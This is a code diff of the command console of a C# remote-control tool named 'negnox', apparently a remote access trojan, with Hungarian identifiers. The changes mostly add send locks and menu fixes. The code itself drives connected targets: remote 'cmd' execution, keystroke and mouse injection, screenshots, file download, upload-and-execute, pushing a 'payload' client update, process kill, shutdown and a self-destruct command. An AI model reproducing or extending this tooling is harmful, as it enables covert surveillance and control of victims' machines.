@@ -16,12 +16,14 @@ using System.Net;
 
 namespace negnox.Classok
 {
+
     public static class Commandok
     {
         public static bool forCiklus = false;
         public static List<string> forCommands = new List<string>();
         public static int forCiklusCount = 0;
         public static bool futHttp = false;
+
         public static void CheckCommand(string x)
         {
             if (x.StartsWith("#"))
@@ -135,9 +137,11 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                 case "setwallpaper":
                 case "sw":
 
-
-                    Send("setwallpaper");
-                    Send(bemenetek[1]);
+                    lock (sendLock)
+                    {
+                        Send("setwallpaper");
+                        Send(bemenetek[1]);
+                    }
                     break;
 
 
@@ -149,8 +153,12 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         Console.WriteLine("Biztos hogy meg akarod tenni?");
                         if (Console.ReadKey().Key == ConsoleKey.Y)
                         {
-                            Send("kys");
-                            Send("-");
+                            lock (sendLock)
+                            {
+                                Send("kys");
+                                Send("-");
+                            }
+                            
                         }
                     }
                     else
@@ -161,10 +169,18 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     }
                     break; ;
                 case "update":
-                    Send("update");
-                    Send("dummytext");
+                    lock (sendLock)
+                    {
+                        Send("update");
+                        Send("dummytext");
+                    }
+                    
                     Thread.Sleep(200);
-                    SendFile($".\\payload\\nclient.exe", ":DDD");
+                    lock (sendLock)
+                    {
+                        SendFile($".\\payload\\nclient.exe", ":DDD");
+                    }
+                    
                     break;
                 case "delete":
                     if (!bemenet.StartsWith("\"") || !bemenet.Contains("\""))
@@ -172,8 +188,12 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         Log("$Nem helyes a szintaxis!$");
                         break;
                     }
-                    Send("delete");
-                    Send(bemenetek[1]);
+                    lock (sendLock)
+                    {
+                        Send("delete");
+                        Send(bemenetek[1]);
+                    }
+
                     break;
 
                 case "starget":
@@ -184,7 +204,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     top = Console.CursorTop;
 
 
-                    string[] ipk = kliensek.Select(i => i.Client.RemoteEndPoint.ToString()).ToArray();
+                    string[] ipk = kliensek.Select(i => i.Client.RemoteEndPoint.ToString()).OrderBy(i=>i).ToArray();
 
                     int menuListaStargetHozzaad = 0;
                     if (top >= 25)
@@ -199,22 +219,30 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         ConsoleColor.Black, ConsoleColor.Gray, ConsoleColor.Gray, ConsoleColor.Green, konzolmenuFejlesztes.Orientation.vertical, true, true) - 1;
 
                     konzolmenu.Ablak(84, top+menuListaStargetHozzaad, 24, 13, ConsoleColor.Black, false, 0);
-
-
+                    Console.ForegroundColor = ConsoleColor.Gray;
+                    Console.BackgroundColor = ConsoleColor.Black;
+                    if (valasztas <= -1)
+                    {
+                        Console.SetCursorPosition(left, top);
+                        break;
+                    }
                     targetIp = kliensek.Where(i => i.Client.RemoteEndPoint.ToString() == ipk[valasztas]).First().Client.RemoteEndPoint.ToString();
                     targetIp = targetIp.Split(':')[0];
                     vanTarget = true;
-                    Console.ForegroundColor = ConsoleColor.Gray;
-                    Console.BackgroundColor = ConsoleColor.Black;
+                    
                     //Console.Clear();
                     Console.SetCursorPosition(left, top);
-                    Log($"[|Célpont beállítva :| {targetIp}]");
+                    Log($"[-] [|Célpont beállítva :| {targetIp}]");
                     Console.Title = $"Negnox Console target:{targetIp}";
                     break;
                 case "msgbox":
                 case "msgb":
-                    Send("msgbox");
-                    Send(bemenet);
+                    lock (sendLock)
+                    {
+                        Send("msgbox");
+                        Send(bemenet);
+                    }
+
                     break;
                 case "lsc":
 
@@ -240,17 +268,29 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     break;
 
                 case "mousex":
-                    Send("mousex");
-                    Send(xSplittelve[1]);
+                    lock (sendLock)
+                    {
+                        Send("mousex");
+                        Send(xSplittelve[1]);
+                    }
+
                     break;
                 case "mousey":
-                    Send("mousey");
-                    Send(xSplittelve[1]);
+                    lock (sendLock)
+                    {
+                        Send("mousey");
+                        Send(xSplittelve[1]);
+                    }
+                    
                     break;
                 case "keystroke":
                 case "ks":
-                    Send("keystroke");
-                    Send(bemenet);
+                    lock (sendLock)
+                    {
+                        Send("keystroke");
+                        Send(bemenet);
+                    }
+
                     break;
 
                 case "kill":
@@ -259,8 +299,12 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         Log("$Nem helyes a szintaxis!$");
                         break;
                     }
-                    Send(xSplittelve[0]);
-                    Send(bemenetek[1]);
+                    lock (sendLock)
+                    {
+                        Send(xSplittelve[0]);
+                        Send(bemenetek[1]);
+                    }
+
                     break;
 
 
@@ -272,20 +316,37 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         Log("$Nem helyes a szintaxis!$");
                         break;
                     }
-                    Send("processS");
-                    Send(bemenetek[1]);
+                    lock (sendLock)
+                    {
+                        Send("processS");
+                        Send(bemenetek[1]);
+                    }
+
                     break;
                 case "logoff":
-                    Send("logoff");
+                    lock (sendLock)
+                    {
+                        Send("logoff");
+                        Send("-");
+                    }
+
                     break;
 
                 case "shutdown":
-                    Send("shutdown");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("shutdown");
+                        Send("-");
+                    }
+
                     break;
                 case "restart":
-                    Send("restart");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("restart");
+                        Send("-");
+                    }
+
                     break;
                 //ezek ilyen cmd szeru directory mozgas dolgok lokalisan
                 case "reload":
@@ -299,30 +360,46 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                 case "cd":
                     if (!CheckTargetEnabled()) break;
                     logSendingPackets = false;
-                    Send("cd");
-                    Send(bemenet);
+                    lock (sendLock)
+                    {
+                        Send("cd");
+                        Send(bemenet);
+                    }
+
                     logSendingPackets = true;
                     break;
                 case "cd..":
                     if (!CheckTargetEnabled()) break;
                     logSendingPackets = false;
-                    Send("cd..");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("cd..");
+                        Send("-");
+                    }
+
                     logSendingPackets = true;
                     break;
                 case "ls":
                     if (!CheckTargetEnabled()) break;
                     logSendingPackets = false;
-                    Send("ls");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("ls");
+                        Send("-");
+                    }
+
                     logSendingPackets = true;
                     break;
 
                 case "pwd":
                     if (!CheckTargetEnabled()) break;
                     logSendingPackets = false;
-                    Send("pwd");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("pwd");
+                        Send("-");
+                    }
+
                     logSendingPackets = true;
                     break;
                 case "pwdme":
@@ -332,9 +409,12 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     break;
                 case "download":
                     if (!CheckTargetEnabled()) break;
-                    Send("download");
-                    //MessageBox.Show(bemenet);
-                    Send(bemenet);
+                    lock (sendLock)
+                    {
+                        Send("download");
+                        Send(bemenet);
+                    }
+
                     break;
                 case "cdme":
                     if (xSplittelve[1] == "..")
@@ -413,11 +493,19 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     {
                         string hova = bemenetek[3];
 
-                        SendFile(filePath, hova);
+                        lock (sendLock)
+                        {
+                            SendFile(filePath, hova);
+                        }
+                        
                     }
                     else
                     {
-                        SendFile(filePath, ":DDD");
+                        lock (sendLock)
+                        {
+                            SendFile(filePath, ":DDD");
+                        }
+
                     }
                     break;
                 case "exet":
@@ -439,16 +527,27 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     if (xSplittelve.Length == 3)
                     {
                         string hova = bemenetek[3];
-                        SendFile(filePath, hova);
+                        lock (sendLock)
+                        {
+                            SendFile(filePath, hova);
+                        }
+
                     }
                     else
                     {
-                        SendFile(filePath, "%exetpath%");
+                        lock (sendLock)
+                        {
+                            SendFile(filePath, "%exetpath%");
+                        }
+
                     }
 
+                    lock (sendLock)
+                    {
+                        Send("processS");
+                        Send($"%exetpath%\\{Path.GetFileName(filePath)}");
+                    }
 
-                    Send("processS");
-                    Send($"%exetpath%\\{Path.GetFileName(filePath)}");
 
                     break;
 
@@ -456,21 +555,33 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                 case "getresponse":
                 case "grp":
                     if (!CheckTargetEnabled()) break;
-                    Send("getres");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("getres");
+                        Send("-");
+                    }
+
                     break;
                 case "fetchsysinfo":
                 case "fsi":
                     if (!CheckTargetEnabled()) break;
-                    Send("fsi");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("fsi");
+                        Send("-");
+                    }
+
                     break;
 
                 case "fetchrunningprocesses":
                 case "frp":
                     if (!CheckTargetEnabled()) break;
-                    Send("frp");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("frp");
+                        Send("-");
+                    }
+
                     break;
 
 
@@ -478,13 +589,21 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                 case "fetchscreens":
                 case "fsc":
                     if (!CheckTargetEnabled()) break;
-                    Send("fsc");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("fsc");
+                        Send("-");
+                    }
+
 
                     break;
                 case "cmd":
-                    Send("cmd");
-                    Send(bemenet);
+                    lock (sendLock)
+                    {
+                        Send("cmd");
+                        Send(bemenet);
+                    }
+
                     break;
 
                 case "screenshot": case "scr":
@@ -493,8 +612,12 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     {
                         screenShotJon = true;
                     }
-                    Send("screenshot");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("screenshot");
+                        Send("-");
+                    }
+
                     break;
                 case "sgl":
                     Console.WriteLine("fasz tudja mi ez a parancs de bent maradtxd");
@@ -502,9 +625,13 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     break;
 
                 case "audio":
-                    Send("audio");
-                    if (string.IsNullOrEmpty(bemenet)) Send("100");
-                    else Send(bemenet);
+                    lock (sendLock)
+                    {
+                        Send("audio");
+                        if (string.IsNullOrEmpty(bemenet)) Send("100");
+                        else Send(bemenet);
+                    }
+
 
                     break;
 
@@ -644,23 +771,39 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     switch (xSplittelve[1])
                     {
                         case "add":
-                            Send("subcontroller");
-                            Send($"add {xSplittelve[2]}");
+                            lock (sendLock)
+                            {
+                                Send("subcontroller");
+                                Send($"add {xSplittelve[2]}");
+                            }
+
                             break;
                         case "remove":
-                            Send("subcontroller");
-                            Send($"remove {xSplittelve[2]}");
+                            lock (sendLock)
+                            {
+                                Send("subcontroller");
+                                Send($"remove {xSplittelve[2]}");
+                            }
+
                             break;
                         case "list":
-                            Send("subcontroller");
-                            Send($"list");
+                            lock (sendLock)
+                            {
+                                Send("subcontroller");
+                                Send($"list");
+                            }
+
                             break;
                         default:
                             Console.WriteLine("subcontroller add 'ip cím'    - hozzá ad egy új ipt");
                             Console.WriteLine("subcontroller remove 'ip cím' - eltávolítja a bizonyos ip-t");
                             Console.WriteLine("subcontroller list 'ip cím'   - kilistázza hány negnox serverre próbál csatlakozni");
-                            Send("subcontroller");
-                            Send("-");
+                            lock (sendLock)
+                            {
+                                Send("subcontroller");
+                                Send("-");
+                            }
+
                             break;
                     }
 
@@ -668,8 +811,12 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     break;
 
                 case "reloadclient":
-                    Send("reload");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("reload");
+                        Send("-");
+                    }
+
                     break;
 
                 case "cmdme":
@@ -825,9 +972,8 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         httpListener.Prefixes.Add(url);
                         httpListener.Start();
                         //Log($"Fut a szerver itt {url}");
-
-                        Task listenTask = HandleIncomingHttpConnections();
-                        _ = listenTask;
+                        //Task listenTask = HandleIncomingHttpConnections();
+                        _ = HandleIncomingHttpConnections();
                         Log($"[+] [|Http szerver sikeresen lindítva! itt : |÷{url}÷]");
                     } else
                     {
@@ -842,8 +988,12 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     Log($"[|+|] [Http szerver $bezárva$]");
                     break;
                 case "click":
-                    Send("click");
-                    Send("-");
+                    lock (sendLock)
+                    {
+                        Send("click");
+                        Send("-");
+                    }
+
                     break;
 
                 case "cls":
